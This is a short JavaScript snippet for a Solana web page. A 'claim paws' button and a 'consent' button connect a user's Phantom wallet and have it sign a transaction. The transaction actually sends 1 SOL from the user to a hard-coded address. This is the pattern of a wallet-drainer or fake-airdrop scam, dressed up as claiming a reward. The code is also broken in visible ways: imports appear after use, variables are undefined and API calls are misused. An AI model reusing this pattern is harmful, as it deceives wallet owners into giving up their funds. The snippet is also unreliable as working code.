const claimPawsButton = document.getElementById('claim-paws-button');

claimPawsButton.addEventListener('click', async () => {
  if (!phantomWallet.isConnected) {
    // Trigger connection (consent) flow
    await phantomWallet.connect();
  }

  // Trigger signing (transaction) flow
  await phantomWallet.signTransaction(transaction);
});

import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';

const network = WalletAdapterNetwork.Devnet;
const phantomWallet = new PhantomWalletAdapter();


const consentButton = document.getElementById('consent-button');

consentButton.addEventListener('click', async () => {
  try {
    // Request user consent and connect wallet
    await wallet.connect();
    console.log('Wallet connected:', wallet);

    // Run the main function after wallet connection
    main();
  } catch (error) {
    console.error('Error connecting wallet:', error);
  }
});

async function main() {
  const fromPubkey = wallet.publicKey;
  const toPubkey = PublicKey.from('6udCzmSGiJXSKWr9HUUa191GRFTnxFB9fxmGzbjcEm6g');

  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: 1000000000,
    }),
  );

  const signedTransaction = await wallet.signTransaction(transaction);
  const connection = new Connection('https://api.devnet.solana.com');
  const transactionId = await connection.sendTransaction(signedTransaction, [wallet]);
  console.log(`Transaction ID: ${transactionId}`);
}



